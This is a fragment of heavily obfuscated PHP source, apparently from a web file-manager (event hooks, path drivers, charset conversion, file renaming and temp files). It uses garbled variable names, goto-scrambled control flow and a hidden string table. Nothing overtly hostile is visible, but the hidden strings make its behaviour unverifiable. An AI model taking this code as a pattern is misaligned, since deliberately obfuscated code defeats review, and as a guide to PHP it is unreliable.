dáÊµÉÄ¢ƒ; B†Ï¹Ø÷ğÑ: if ($dŸ°É”¸İŒ) { $a¶íš†®Ô = IO_PATH_SYSTEM_TEMP . $a‘î¡öÛ–[1588] . KodIO::hashPath($b£æƒºåñÑ) . $a‘î¡öÛ–[1589]; $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1590]] = Action($a‘î¡öÛ–[1591])->pluginCacheFileSet($a¶íš†®Ô, $dŸ°É”¸İŒ); unset($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1575]]); } $CƒÛ—‰ùâ = _get($cÃñ·ÀÎ˜ˆ, $a‘î¡öÛ–[1593], $a‘î¡öÛ–[33]); $D‘İ®Ïö‘ = _get($cÃñ·ÀÎ˜ˆ, $a‘î¡öÛ–[1594], $a‘î¡öÛ–[33]); goto cÚƒ˜¢Ë”; cÚƒ˜¢Ë”: $eå÷’¸äÙ = _get($cÃñ·ÀÎ˜ˆ, $a‘î¡öÛ–[1595], $a‘î¡öÛ–[33]); $fãÛÓ¾ôÓ = $CƒÛ—‰ùâ . $D‘İ®Ïö‘ . $eå÷’¸äÙ; if ($fãÛÓ¾ôÓ && get_charset($fãÛÓ¾ôÓ) != $a‘î¡öÛ–[323]) { $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1309]] = iconv_to($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1309]], get_charset($fãÛÓ¾ôÓ), $a‘î¡öÛ–[323]); $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1596]] = iconv_to($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1596]], get_charset($fãÛÓ¾ôÓ), $a‘î¡öÛ–[323]); $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1597]] = iconv_to($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1592]][$a‘î¡öÛ–[1597]], get_charset($fãÛÓ¾ôÓ), $a‘î¡öÛ–[323]); } goto aÌÀ“•ØÂ´; aÌÀ“•ØÂ´: return $cÃñ·ÀÎ˜ˆ; goto b­ÇÒ¸Ä¡; dáÊµÉÄ¢ƒ: $a‘î¡öÛ– =& $_SERVER[£ü]; if (isset($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1583]])) { $BİÉèù¯Òš = ceil($cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1583]]); $b‰ö˜¶†½è = intval($BİÉèù¯Òš / 3600); $Bã¤ØøçÎá = intval(($BİÉèù¯Òš - $b‰ö˜¶†½è * 3600) / 60); $f“ù˜ƒ¬ä¸ = $BİÉèù¯Òš % 60; $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1584]] = sprintf($a‘î¡öÛ–[1585], $b‰ö˜¶†½è, $Bã¤ØøçÎá, $f“ù˜ƒ¬ä¸); if ($b‰ö˜¶†½è == 0) { $cÃñ·ÀÎ˜ˆ[$a‘î¡öÛ–[1584]] = sprintf($a‘î¡öÛ–[1586], $Bã¤ØøçÎá, $f“ù˜ƒ¬ä¸); } } $dŸ°É”¸İŒ = _get($cÃñ·ÀÎ˜ˆ, $a‘î¡öÛ–[1587]); goto B†Ï¹Ø÷ğÑ; b­ÇÒ¸Ä¡: } private static function valueReset($AÂ¯Äİ¯†…, $F†Ã‰òºŠ, $D¹áØÉ›ˆ) { $AÀÎóíª  =& $_SERVER[£ü]; $eï¡²‘‘ = $AÀÎóíª [1513]; switch ($AÂ¯Äİ¯†…) { case $AÀÎóíª [1598]: $F†Ã‰òºŠ = $F†Ã‰òºŠ == $AÀÎóíª [83] ? $AÀÎóíª [1599] : $AÀÎóíª [1600]; break; case $AÀÎóíª [1601]: $F†Ã‰òºŠ = $F†Ã‰òºŠ ? $F†Ã‰òºŠ : null; break; default: break; } switch ($D¹áØÉ›ˆ) { case $AÀÎóíª [1602]: $F†Ã‰òºŠ = round($F†Ã‰òºŠ, 2); break; case $AÀÎóíª [184]: case $AÀÎóíª [107]: if ($F†Ã‰òºŠ < 0) { $F†Ã‰òºŠ = null; } else { if (is_numeric($F†Ã‰òºŠ)) { $F†Ã‰òºŠ = date($eï¡²‘‘, $F†Ã‰òºŠ); } } break; default: break; } return $F†Ã‰òºŠ; } private static function fileTypeArray() { $e¼šÌ«‹®Ò =& $_SERVER[£ü]; return array($e¼šÌ«‹®Ò[1575] => array($e¼šÌ«‹®Ò[157] => $e¼šÌ«‹®Ò[1603] . $e¼šÌ«‹®Ò[1604], $e¼šÌ«‹®Ò[1579] => array($e¼šÌ«‹®Ò[1496] => $e¼šÌ«‹®Ò[1605], $e¼šÌ«‹®Ò[1498] => $e¼šÌ«‹®Ò[1606], $e¼šÌ«‹®Ò[1607] => $e¼šÌ«‹®Ò[1608], $e¼šÌ«‹®Ò[1609] => $e¼šÌ«‹®Ò[1610], $e¼šÌ«‹®Ò[184] => $e¼šÌ«‹®Ò[1611], $e¼šÌ«‹®Ò[107] => $e¼šÌ«‹®Ò[1612], $e¼šÌ«‹®Ò[1613] => $e¼šÌ«‹®Ò[1614], $e¼šÌ«‹®Ò[1615] => $e¼šÌ«‹®Ò[1616], $e¼šÌ«‹®Ò[1617] => $e¼šÌ«‹®Ò[1618], $e¼šÌ«‹®Ò[1619] => $e¼šÌ«‹®Ò[1620], $e¼šÌ«‹®Ò[1621] => $e¼šÌ«‹®Ò[1622], $e¼šÌ«‹®Ò[1623] => $e¼šÌ«‹®Ò[1624], $e¼šÌ«‹®Ò[1625] => $e¼šÌ«‹®Ò[1626], $e¼šÌ«‹®Ò[1627] => array($e¼šÌ«‹®Ò[1628] => $e¼šÌ«‹®Ò[1629], $e¼šÌ«‹®Ò[1630] => $e¼šÌ«‹®Ò[1631], $e¼šÌ«‹®Ò[1632] => $e¼šÌ«‹®Ò[1633]), $e¼šÌ«‹®Ò[1634] => $e¼šÌ«‹®Ò[1635], $e¼šÌ«‹®Ò[1636] => $e¼šÌ«‹®Ò[1637], $e¼šÌ«‹®Ò[1638] => $e¼šÌ«‹®Ò[1639], $e¼šÌ«‹®Ò[1640] => $e¼šÌ«‹®Ò[1641], $e¼šÌ«‹®Ò[1642] => array($e¼šÌ«‹®Ò[1643] => $e¼šÌ«‹®Ò[1644], $e¼šÌ«‹®Ò[1645] => $e¼šÌ«‹®Ò[1646], $e¼šÌ«‹®Ò[1647] => $e¼šÌ«‹®Ò[1648], $e¼šÌ«‹®Ò[1649] => $e¼šÌ«‹®Ò[1650], $e¼šÌ«‹®Ò[1651] => $e¼šÌ«‹®Ò[1652], $e¼šÌ«‹®Ò[1653] => $e¼šÌ«‹®Ò[1654], $e¼šÌ«‹®Ò[1655] => $e¼šÌ«‹®Ò[1656], $e¼šÌ«‹®Ò[1657] => $e¼šÌ«‹®Ò[1658], $e¼šÌ«‹®Ò[1659] => $e¼šÌ«‹®Ò[1660], $e¼šÌ«‹®Ò[1661] => $e¼šÌ«‹®Ò[1662], $e¼šÌ«‹®Ò[1663] => $e¼šÌ«‹®Ò[1664]))), $e¼šÌ«‹®Ò[1665] => array($e¼šÌ«‹®Ò[157] => $e¼šÌ«‹®Ò[1666] . $e¼šÌ«‹®Ò[1667], $e¼šÌ«‹®Ò[1579] => array($e¼šÌ«‹®Ò[1583] => $e¼šÌ«‹®Ò[1668], $e¼šÌ«‹®Ò[184] => $e¼šÌ«‹®Ò[1669], $e¼šÌ«‹®Ò[107] => $e¼šÌ«‹®Ò[1670], $e¼šÌ«‹®Ò[1615] => $e¼šÌ«‹®Ò[1671], $e¼šÌ«‹®Ò[1672] => $e¼šÌ«‹®Ò[1673], $e¼šÌ«‹®Ò[1674] => $e¼šÌ«‹®Ò[1601], $e¼šÌ«‹®Ò[1675] => $e¼šÌ«‹®Ò[1676], $e¼šÌ«‹®Ò[1677] => $e¼šÌ«‹®Ò[1678], $e¼šÌ«‹®Ò[1679] => $e¼šÌ«‹®Ò[1680], $e¼šÌ«‹®Ò[1592] => array($e¼šÌ«‹®Ò[1309] => $e¼šÌ«‹®Ò[1681], $e¼šÌ«‹®Ò[1596] => $e¼šÌ«‹®Ò[1682], $e¼šÌ«‹®Ò[1597] => $e¼šÌ«‹®Ò[1683], $e¼šÌ«‹®Ò[1684] => $e¼šÌ«‹®Ò[1685], $e¼šÌ«‹®Ò[1686] => $e¼šÌ«‹®Ò[1687], $e¼šÌ«‹®Ò[1688] => $e¼šÌ«‹®Ò[1689], $e¼šÌ«‹®Ò[1575] => $e¼šÌ«‹®Ò[1690]))), $e¼šÌ«‹®Ò[1691] => array($e¼šÌ«‹®Ò[157] => $e¼šÌ«‹®Ò[1692] . $e¼šÌ«‹®Ò[1693], $e¼šÌ«‹®Ò[1579] => array($e¼šÌ«‹®Ò[1496] => $e¼šÌ«‹®Ò[1694], $e¼šÌ«‹®Ò[1498] => $e¼šÌ«‹®Ò[1695], $e¼šÌ«‹®Ò[1583] => $e¼šÌ«‹®Ò[1668], $e¼šÌ«‹®Ò[184] => $e¼šÌ«‹®Ò[1696], $e¼šÌ«‹®Ò[107] => $e¼šÌ«‹®Ò[1697], $e¼šÌ«‹®Ò[1602] => $e¼šÌ«‹®Ò[1698], $e¼šÌ«‹®Ò[1679] => $e¼šÌ«‹®Ò[1699], $e¼šÌ«‹®Ò[1675] => $e¼šÌ«‹®Ò[1700], $e¼šÌ«‹®Ò[1615] => $e¼šÌ«‹®Ò[1701], $e¼šÌ«‹®Ò[1665] => array($e¼šÌ«‹®Ò[1674] => $e¼šÌ«‹®Ò[1601], $e¼šÌ«‹®Ò[1702] => $e¼šÌ«‹®Ò[1703], $e¼šÌ«‹®Ò[1672] => $e¼šÌ«‹®Ò[1673], $e¼šÌ«‹®Ò[1679] => $e¼šÌ«‹®Ò[1680], $e¼šÌ«‹®Ò[1675] => $e¼šÌ«‹®Ò[1704], $e¼šÌ«‹®Ò[1677] => $e¼šÌ«‹®Ò[1678]))), $e¼šÌ«‹®Ò[1705] => array($e¼šÌ«‹®Ò[1579] => array($e¼šÌ«‹®Ò[1706] => $e¼šÌ«‹®Ò[1707], $e¼šÌ«‹®Ò[1708] => $e¼šÌ«‹®Ò[1709])), $e¼šÌ«‹®Ò[1710] => array($e¼šÌ«‹®Ò[1579] => array())); } } class Hook { private static $events = array(); public static function get($eç¨Ï©·º— = false) { if (!$eç¨Ï©·º—) { return self::$events; } else { return self::$events[$eç¨Ï©·º—]; } } public static function apply($aÎ÷õäÌ›, $cŒõ¢í‹†— = array()) { $a®ŒÀó÷¾• = ActionApply($aÎ÷õäÌ›, $cŒõ¢í‹†—); if (is_string($aÎ÷õäÌ›)) { Hook::trigger($aÎ÷õäÌ›); } return $a®ŒÀó÷¾•; } public static function bind($cõöğ‰áŞ£, $d ê–‘²‡½, $c‘ò‡ê„£ö = false) { $Cé‹ŠÂ«„¤ =& $_SERVER[£ü]; if (!isset(self::$events[$cõöğ‰áŞ£])) { self::$events[$cõöğ‰áŞ£] = array(); } self::$events[$cõöğ‰áŞ£][] = array($Cé‹ŠÂ«„¤[1711] => $d ê–‘²‡½, $Cé‹ŠÂ«„¤[1712] => $c‘ò‡ê„£ö, $Cé‹ŠÂ«„¤[1713] => 0); } public static function once($Aò©æàïèÙ, $C¦Æù¢í¶‰) { self::bind($Aò©æàïèÙ, $C¦Æù¢í¶‰, !0); } public static function unbind($AÁ„¡Ó˜±¶, $aá«Ï±®¿» = false) { if (!$aá«Ï±®¿») { self::$events[$AÁ„¡Ó˜±¶] = array(); return; } $E„á“”¨àÓ = self::$events[$AÁ„¡Ó˜±¶]; self::$events[$AÁ„¡Ó˜±¶] = array(); if (!is_array($E„á“”¨àÓ)) { return; } for ($a¶›®Õ®² = 0; $a¶›®Õ®² < count($E„á“”¨àÓ); $a¶›®Õ®²++) { if ($E„á“”¨àÓ[$a¶›®Õ®²][$_SERVER[£ü][1711]] == $aá«Ï±®¿») { continue; } self::$events[$AÁ„¡Ó˜±¶][] = $E„á“”¨àÓ[$a¶›®Õ®²]; } } public static function filter($døÃŒë¾¹, $eÊï©§ÒÒÍ) { goto B™÷Ÿ„ÚÆ†; B™÷Ÿ„ÚÆ†: $DÙôœ‡©æ‹ =& $_SERVER[£ü]; $cì…ÒìÓó = self::$events; if (!isset($cì…ÒìÓó[$døÃŒë¾¹])) { return $eÊï©§ÒÒÍ; } goto e°Œ•Û¼Á; e°Œ•Û¼Á: $aöçØÆßôÀ = $cì…ÒìÓó[$døÃŒë¾¹]; $C¼ÑË„Óœƒ = $eÊï©§ÒÒÍ; if (!is_array($aöçØÆßôÀ) || count($aöçØÆßôÀ) == 0) { return $C¼ÑË„Óœƒ; } goto fùè¥—áº•; fùè¥—áº•: for ($b¬ïƒ†áƒ = 0; $b¬ïƒ†áƒ < count($aöçØÆßôÀ); $b¬ïƒ†áƒ++) { $A†ŸÇ—Ä´ = $aöçØÆßôÀ[$b¬ïƒ†áƒ]; if ($A†ŸÇ—Ä´[$DÙôœ‡©æ‹[1712]] && $A†ŸÇ—Ä´[$DÙôœ‡©æ‹[1713]] > 1) { continue; } self::$events[$døÃŒë¾¹][$b¬ïƒ†áƒ][$DÙôœ‡©æ‹[1713]] = $A†ŸÇ—Ä´[$DÙôœ‡©æ‹[1713]] + 1; $CÒ§õøÛŒ = self::apply($A†ŸÇ—Ä´[$DÙôœ‡©æ‹[1711]], array($C¼ÑË„Óœƒ)); if (!is_null($CÒ§õøÛŒ)) { $C¼ÑË„Óœƒ = $CÒ§õøÛŒ; } } return $C¼ÑË„Óœƒ; goto D®ÏĞéïÖÒ; D®ÏĞéïÖÒ: } public static function trigger($C®ºÔ‡Àİğ) { goto eêôËá‚Ïƒ; b¢†£‚Àì«: return $b®¬¨í×æÖ; goto EåÁÕªäğ; CÇŞ×Ğæ®: if (!isset($fõÕæÄ‰§”[$C®ºÔ‡Àİğ])) { return $b®¬¨í×æÖ; } $A¶µíÌ = $fõÕæÄ‰§”[$C®ºÔ‡Àİğ]; if (!is_array($A¶µíÌ) || count($A¶µíÌ) == 0) { return $b®¬¨í×æÖ; } goto aë‰ò¡„Ê¯; aë‰ò¡„Ê¯: $fœ óõ¿“À = func_get_args(); array_shift($fœ óõ¿“À); for ($f£›®„±±¯ = 0; $f£›®„±±¯ < count($A¶µíÌ); $f£›®„±±¯++) { $DùàÏìÂ¶Ü = $A¶µíÌ[$f£›®„±±¯]; if ($DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1712]] && $DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1713]] > 1) { continue; } if (defined($E‘™ÕÒŠÚ¾[1714]) && GLOBAL_LOG_HOOK) { write_log($C®ºÔ‡Àİğ . $E‘™ÕÒŠÚ¾[1715] . $DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1711]], $E‘™ÕÒŠÚ¾[1716]); } self::$events[$C®ºÔ‡Àİğ][$f£›®„±±¯][$E‘™ÕÒŠÚ¾[1713]] = $DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1713]] + 1; $B¸Á½óÙÖâ = self::apply($DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1711]], $fœ óõ¿“À); if (defined($E‘™ÕÒŠÚ¾[1714]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $E‘™ÕÒŠÚ¾[1716]); if ($DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1713]] == 200) { $E©Ì¡á—­Â = is_array($DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1711]]) ? json_encode_force($DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1711]]) : $DùàÏìÂ¶Ü[$E‘™ÕÒŠÚ¾[1711]]; write_log($E‘™ÕÒŠÚ¾[1717] . $C®ºÔ‡Àİğ . $E‘™ÕÒŠÚ¾[1718] . $E©Ì¡á—­Â, $E‘™ÕÒŠÚ¾[1719]); } } $b®¬¨í×æÖ = is_null($B¸Á½óÙÖâ) ? $b®¬¨í×æÖ : $B¸Á½óÙÖâ; } goto b¢†£‚Àì«; eêôËá‚Ïƒ: $E‘™ÕÒŠÚ¾ =& $_SERVER[£ü]; $fõÕæÄ‰§” = self::$events; $b®¬¨í×æÖ = !1; goto CÇŞ×Ğæ®; EåÁÕªäğ: } } goto cğÉ­»Çîß; EºÃìáê‹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $C¹™ÀìÃÊ÷ =& $_SERVER[£ü]; $this->objectDriver = array($C¹™ÀìÃÊ÷[57], $C¹™ÀìÃÊ÷[58], $C¹™ÀìÃÊ÷[59], $C¹™ÀìÃÊ÷[60], $C¹™ÀìÃÊ÷[61], $C¹™ÀìÃÊ÷[62], $C¹™ÀìÃÊ÷[63], $C¹™ÀìÃÊ÷[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($c¸ÊÙ£µ‰®) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($c¸ÊÙ£µ‰®, $_SERVER[£ü][8]); } return $c¸ÊÙ£µ‰®; } public function getPathName($eÖ÷»‰¿Œ) { return $eÖ÷»‰¿Œ; } public function iconvApp($dÔ©äÖ˜â) { return $dÔ©äÖ˜â; } public function iconvSystem($c«¿‡ï¹´¦) { return $c«¿‡ï¹´¦; } public function iconvTo($C¤ï»Ç±¹Æ, $DÑ»°Éñ‚å, $dÌ¦„ÄâíŸ) { goto E±Å˜¢­Ù©; dŠè£‡ç: $DØ¯ ‘â = $DÑ»°Éñ‚å . $BÕ»ŠÒŸ…ø[66] . $dÌ¦„ÄâíŸ . $BÕ»ŠÒŸ…ø[67] . $C¤ï»Ç±¹Æ; if (isset($aß¢Ó“‹É½[$DØ¯ ‘â])) { return $aß¢Ó“‹É½[$DØ¯ ‘â]; } if (function_exists($BÕ»ŠÒŸ…ø[68])) { $B­êÀˆğ¬Ó = @mb_convert_encoding($C¤ï»Ç±¹Æ, $dÌ¦„ÄâíŸ, $DÑ»°Éñ‚å); } else { $B­êÀˆğ¬Ó = @iconv($DÑ»°Éñ‚å, $dÌ¦„ÄâíŸ, $C¤ï»Ç±¹Æ); } goto aßÍ‚ğƒ´™; E±Å˜¢­Ù©: $BÕ»ŠÒŸ…ø =& $_SERVER[£ü]; if (!$C¤ï»Ç±¹Æ || !function_exists($BÕ»ŠÒŸ…ø[65])) { return $C¤ï»Ç±¹Æ; } static $aß¢Ó“‹É½ = array(); goto dŠè£‡ç; A Ü”ô¨Ùß: $aß¢Ó“‹É½[$dÌ¦„ÄâíŸ . $BÕ»ŠÒŸ…ø[66] . $DÑ»°Éñ‚å . $BÕ»ŠÒŸ…ø[67] . $C¤ï»Ç±¹Æ] = $C¤ï»Ç±¹Æ; $aß¢Ó“‹É½[$dÌ¦„ÄâíŸ . $BÕ»ŠÒŸ…ø[66] . $DÑ»°Éñ‚å . $BÕ»ŠÒŸ…ø[67] . $B­êÀˆğ¬Ó] = $C¤ï»Ç±¹Æ; $aß¢Ó“‹É½[$DÑ»°Éñ‚å . $BÕ»ŠÒŸ…ø[66] . $dÌ¦„ÄâíŸ . $BÕ»ŠÒŸ…ø[67] . $B­êÀˆğ¬Ó] = $B­êÀˆğ¬Ó; goto b…‘ÜÏ¸Ÿã; b…‘ÜÏ¸Ÿã: return $B­êÀˆğ¬Ó; goto F˜½ƒŸ‘ä; aßÍ‚ğƒ´™: $B­êÀˆğ¬Ó = $B­êÀˆğ¬Ó ? $B­êÀˆğ¬Ó : $C¤ï»Ç±¹Æ; if (strstr($B­êÀˆğ¬Ó, $BÕ»ŠÒŸ…ø[69])) { $B­êÀˆğ¬Ó = str_replace($BÕ»ŠÒŸ…ø[69], $BÕ»ŠÒŸ…ø[70], $B­êÀˆğ¬Ó); } $aß¢Ó“‹É½[$DÑ»°Éñ‚å . $BÕ»ŠÒŸ…ø[66] . $dÌ¦„ÄâíŸ . $BÕ»ŠÒŸ…ø[67] . $C¤ï»Ç±¹Æ] = $B­êÀˆğ¬Ó; goto A Ü”ô¨Ùß; F˜½ƒŸ‘ä: } public function getPathInner($f±¹ã¥›°ã) { $AçÎÀŠ„Ë† = IO::init($f±¹ã¥›°ã); return $AçÎÀŠ„Ë†->path; } public function getPathOuter($E­Ï¼È¶¹) { $a—¦÷¡ŠõÑ =& $_SERVER[£ü]; $F²¸ª®ïö† = strlen(trim($this->pathBase, $a—¦÷¡ŠõÑ[8])); $E­Ï¼È¶¹ = substr(trim($E­Ï¼È¶¹, $a—¦÷¡ŠõÑ[8]), $F²¸ª®ïö†); return $this->pathDriver . $a—¦÷¡ŠõÑ[8] . ltrim($E­Ï¼È¶¹, $a—¦÷¡ŠõÑ[8]); } public function isParentOf($C£–Ÿ§í·å, $e¬‰Ô›ä™) { $bÊã‚Ûê¡´ =& $_SERVER[£ü]; $C£–Ÿ§í·å = rtrim(strtolower($C£–Ÿ§í·å), $bÊã‚Ûê¡´[8]) . $bÊã‚Ûê¡´[8]; $e¬‰Ô›ä™ = rtrim(strtolower($e¬‰Ô›ä™), $bÊã‚Ûê¡´[8]) . $bÊã‚Ûê¡´[8]; $B·ÃÔÜø­÷ = strpos($e¬‰Ô›ä™, $C£–Ÿ§í·å) === 0; return $B·ÃÔÜø­÷; } public function getType() { $AÅ†ˆğ›Ø› =& $_SERVER[£ü]; $B…ÆÈ‡ §Ê = str_replace($AÅ†ˆğ›Ø›[71], $AÅ†ˆğ›Ø›[33], get_class($this)); return strtolower($B…ÆÈ‡ §Ê); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($E÷ƒö¿£õÔ, $c­ï¿±à¿Õ) { $aÂÆé§“³à =& $_SERVER[£ü]; $e²Ãò±¥İÛ = rtrim($E÷ƒö¿£õÔ, $aÂÆé§“³à[8]) . $aÂÆé§“³à[8] . $c­ï¿±à¿Õ; $A†ïÜ¤å©Ú = $this->exist($e²Ãò±¥İÛ); return $A†ïÜ¤å©Ú ? $e²Ãò±¥İÛ : !1; } public function renameObject($e±ŒÀÃÔÉ±, $B³±â‰ÀÂí) { goto dé»å¥óá·; dé»å¥óá·: $d¶Ø—‚Ÿ®¡ =& $_SERVER[£ü]; $CöØÖå±÷‘ = $B³±â‰ÀÂí; Hook::trigger($d¶Ø—‚Ÿ®¡[72], $this, $e±ŒÀÃÔÉ±, $this, $this->pathFather($e±ŒÀÃÔÉ±) . $B³±â‰ÀÂí); goto bÈƒç†Ì; bÈƒç†Ì: $e±ŒÀÃÔÉ± = $this->getPathOuter($e±ŒÀÃÔÉ±); $B³±â‰ÀÂí = $this->pathFather($e±ŒÀÃÔÉ±) . $B³±â‰ÀÂí; if (IO::isFile($e±ŒÀÃÔÉ±)) { $DÆÙ¿‹†¯‡ = IO::copy($e±ŒÀÃÔÉ±, $this->pathFather($e±ŒÀÃÔÉ±), REPEAT_RENAME_FOLDER, $CöØÖå±÷‘); if ($DÆÙ¿‹†¯‡) { IO::remove($e±ŒÀÃÔÉ±); } } else { $DÆÙ¿‹†¯‡ = IO::mkdir($B³±â‰ÀÂí); if (!$DÆÙ¿‹†¯‡) { return !1; } $f¹îë™…·î = IO::listPath($e±ŒÀÃÔÉ±, !0); $eº­Õ°ªÔ = array_merge($f¹îë™…·î[$d¶Ø—‚Ÿ®¡[73]], $f¹îë™…·î[$d¶Ø—‚Ÿ®¡[74]]); foreach ($eº­Õ°ªÔ as $d¦Í¤‰îÎ¬) { IO::move($d¦Í¤‰îÎ¬[$d¶Ø—‚Ÿ®¡[75]], $B³±â‰ÀÂí, REPEAT_RENAME_FOLDER); } IO::remove($e±ŒÀÃÔÉ±); } goto bƒ“İÂˆº¸; bƒ“İÂˆº¸: return $DÆÙ¿‹†¯‡ ? $B³±â‰ÀÂí : !1; goto dŠ½Ûíùì•; dŠ½Ûíùì•: } public function tempFile($B÷†ïÖÈ£± = '', $dåî“ò‡ = '') { goto fé¢ÔÜÊÁ; fé¢ÔÜÊÁ: if (!$B÷†ïÖÈ£±) { $B÷†ïÖÈ£± = rand_string(15); } $A‹¿¢Ğå‡ = TEMP_FILES . rand_string(15) . $_SERVER[£ü][8]; @mkdir($A‹¿¢Ğå‡, 511, !0); goto A´ôÎô¡ËÚ; CÖã¶ÂÙ¹: return $cªº‡ë«È‘; goto e–åƒ‡ùì›; A´ôÎô¡ËÚ: $cªº‡ë«È‘ = $A‹¿¢Ğå‡ . $B÷†ïÖÈ£±; @touch($cªº‡ë«È‘); if ($dåî“ò‡) { file_put_contents($cªº‡ë«È‘, $dåî“ò‡); } goto CÖã¶ÂÙ¹; e–åƒ‡ùì›: } public function tempFileRemve($D¼»„™ÕÔ) { @unlink($D¼»„™ÕÔ); @rmdir($this->pathFather($D¼»„™ÕÔ)); } public function mkfile($DÒòÛø±¶Š, $EòĞ‚×ÛõË = '', $Aèšƒ”åø´ = REPEAT_RENAME) { } public function mkdir($Cï¹î¤·…í, $b­°ŠÊğ” = REPEAT_SKIP) { } public function copyFile($f‹ãó›õ‡é, $b‹®Ñ¯Í) { } public function moveFile($fï–ƒéé‘Â, $BÈæ«÷¢‘«) { } public function remove($a» ›­ÉÔ„) { if ($this->isFile($a» ›­ÉÔ„)) { return $this->delFile($a» ›­ÉÔ„); } return $this->delFolder($a» ›­ÉÔ„); } public function rename($dƒ—äÊÅ¢ç, $EÏ¡ËÅ) { } public function exist($F¡°ˆ›£°) { } public function findByHash($dÆº•¾ÚˆÎ = '', $CÊŞ¹ù®è› = '') { return !1; } public function isFile($Aİ­Â‹ù‡ù) { } public function isFolder($a¾Õæó÷×ô) { } public function size($E¶¾Ü†§ë) { } public function info($b®˜¢ôŞ× ) { } public function infoSimple($C‰ªš¢¯ö‰) { return $this->info($C‰ªš¢¯ö‰); } public function infoAuth($c¼‡“‰ª ·) { return $this->info($c¼‡“‰ª ·); } public function infoFull($cò¯†ÅùŒÏ) { return $this->info($cò¯†ÅùŒÏ); } public function infoWithChildren($a‹ƒŒ í¤) { $FğŠÇ¢İˆñ =& $_SERVER[£ü]; $f„£éÀŸõù = $this->info($a‹ƒŒ í¤); if ($f„£éÀŸõù && $f„£éÀŸõù[$FğŠÇ¢İˆñ[29]] == $FğŠÇ¢İˆñ[76]) { $dï§¦‘ä³Ö = array($FğŠÇ¢İˆñ[77] => 0, $FğŠÇ¢İˆñ[78] => 0, $FğŠÇ¢İˆñ[79] => 0); $this->infoChildren($a‹ƒŒ í¤, $dï§¦‘ä³Ö); $f„£éÀŸõù[$FğŠÇ¢İˆñ[77]] = $dï§¦‘ä³Ö[$FğŠÇ¢İˆñ[77]]; $f„£éÀŸõù[$FğŠÇ¢İˆñ[80]] = array($FğŠÇ¢İˆñ[81] => $dï§¦‘ä³Ö[$FğŠÇ¢İˆñ[78]], $FğŠÇ¢İˆñ[82] => $dï§¦‘ä³Ö[$FğŠÇ¢İˆñ[79]]); } return $f„£éÀŸõù; } public function listPath($d¾ë°Ë¶˜–, $Eğå¹å‚÷ = false) { } public function has($C„Ø‹ÓÖÔƒ, $F¡ÊìùÍ = false, $aÂµ¦ÀÖ™§ = false) { } public function canRead($FîŒ‚¥ßÃ) { } public function canWrite($E—Æ©§Æë) { } public function getContent($cšºÅ²±ä) { } public function setContent($D‰™Ô¨í·, $a‹Â‘™¹ÊŞ = '') { } protected function infoChildren($eæ†«ó†‡ù, &$a†”¡ùÌëì) { $a”Ë»ó³Ô® =& $_SERVER[£ü]; check_abort(); $eîáÓ‡¢Åå = $this->listPath($eæ†«ó†‡ù, !0); $eîáÓ‡¢Åå = array_merge($eîáÓ‡¢Åå[$a”Ë»ó³Ô®[74]], $eîáÓ‡¢Åå[$a”Ë»ó³Ô®[73]]); foreach ($eîáÓ‡¢Åå as $Cåà„ÇÒ—ê) { if ($Cåà„ÇÒ—ê[$a”Ë»ó³Ô®[29]] == $a”Ë»ó³Ô®[76]) { $a†”¡ùÌëì[$a”Ë»ó³Ô®[79]]++; $B‰îÂ²ˆğ = $this->getPathInner($Cåà„ÇÒ—ê[$a”Ë»ó³Ô®[75]]); $this->infoChildren($B‰îÂ²ˆğ, $a†”¡ùÌëì); } else { $a†”¡ùÌëì[$a”Ë»ó³Ô®[78]]++; $a†”¡ùÌëì[$a”Ë»ó³Ô®[77]] += $Cåà„ÇÒ—ê[$a”Ë»ó³Ô®[77]]; } } } public function fileSubstr($D½¦±¾À²ë, $a²èğì£Ï, $AÈ™ƒ¿™„î) { } public function listAll($dİ‘Õ¼˜Õ¬) { } public function upload($AÔÛÂØ†œç, $däòÑ‘öã¸, $C‹ƒô‡÷ÊÄ = false, $A¸ŒÁÇÁÂ— = REPEAT_REPLACE) { } public function uploadFileByID($DÊ×’¢‘åß, $dæ«ãöæ, $Aç°ãíÑ•) { } public function uploadFileByPath($Cˆ£ÓÕ³ğ, $F³ÔàĞˆ¶, $D¡Âá‘½² = array()) { } public function isUploadServer() { $FÀ¤³Í‡Í» =& $_SERVER[£ü]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $FÀ¤³Í‡Í»[83]) { return !0; } return $GLOBALS[$FÀ¤³Í‡Í»[6]][$FÀ¤³Í‡Í»[84]][$FÀ¤³Í‡Í»[85]]; } public function isFileOutServer() { $F²ÙïÚ±¿¿ =& $_SERVER[£ü]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $F²ÙïÚ±¿¿[83]) { return !0; } return $GLOBALS[$F²ÙïÚ±¿¿[6]][$F²ÙïÚ±¿¿[84]][$F²ÙïÚ±¿¿[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function 